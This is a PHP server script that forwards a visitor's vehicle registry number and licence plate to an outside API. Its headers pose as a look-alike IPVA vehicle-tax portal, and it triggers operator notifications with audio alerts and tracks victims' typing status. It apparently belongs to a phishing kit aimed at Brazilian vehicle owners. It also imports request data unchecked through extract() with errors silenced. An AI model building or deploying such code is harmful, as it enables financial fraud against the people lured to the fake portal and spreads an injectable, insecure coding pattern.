<?php

error_reporting(0);

extract($_GET);
extract($_POST);

if($renavam && $placa){

    date_default_timezone_set('America/Sao_Paulo');

    require_once "../db.php";

    function Notifications($mensagem){
        global $pdo;

        $criado_em = date('Y/m/d H:i:s');

        $stmt = $pdo->prepare("INSERT INTO notificacoes (mensagem, criado_em) VALUES (:mensagem, :criado_em)");
        $stmt->execute([':mensagem' => "$mensagem - $criado_em", ':criado_em' => $criado_em]);

        $updateStmt = $pdo->prepare("UPDATE notifications SET audio = :audio, atual = :atual, hora = :hora WHERE id = :id");
        $updateStmt->execute([':audio' => 5, ':atual' => rand(100000000, 99999999999), ':hora' => $criado_em, ':id' => 1]);
    }

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, "https://expresso-goias.tekfire.online/api.php?renavam=$renavam&placa=$placa");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "renavam=$renavam&placa=$placa");
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); 
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);

    $headers = array(
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control: no-cache',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Dnt: 1',
        'Origin: https://portal.expresso-goias.site',
        'Pragma: no-cache',
        'Priority: u=1, i',
        'Referer: https://portal.expresso-goias.site/ipva-portal/busca/',
        'Sec-Ch-Ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'Sec-Ch-Ua-Mobile: ?0',
        'Sec-Ch-Ua-Platform: "Windows"',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: same-origin',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest'
    );
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        try {

            $user_id = $_COOKIE['user_id'] ?? null;

            if ($user_id) {
                $stmt = $pdo->prepare("DELETE FROM typing_status WHERE user_id = :user_id");
                $stmt->execute([':user_id' => $user_id]);
            }

        } catch (Exception $e) {}

    if ($result === false) {

         $error_msg = curl_error($ch);

         Notifications("Erro de conexão com API: $error_msg");

        echo json_encode(array('status' => 'error', 'msg' => "Erro de conexão com a API: $error_msg"));

    } elseif ($http_code != 200) {

         if (strpos($result, 'Not Found') !== false) {
                  
            Notifications('API Not Found');

         }else{

            Notifications("API retornou HTTP $http_code");

         }

        echo json_encode(array('status' => 'error', 'msg' => "API retornou HTTP $http_code"));

    } elseif (strpos($result, '"ok"') !== false) {

        echo $result;

    } else {

        if ($retestar < 3) {
            echo json_encode(array('status' => 2, 'msg' => 'Retestar infor!'));
        } else {
            echo $result;
        }
    }

    curl_close($ch);

} else {
    echo json_encode(array('status' => false, 'msg' => 'Parâmetro placa ou Renavam não fornecido!'));
}
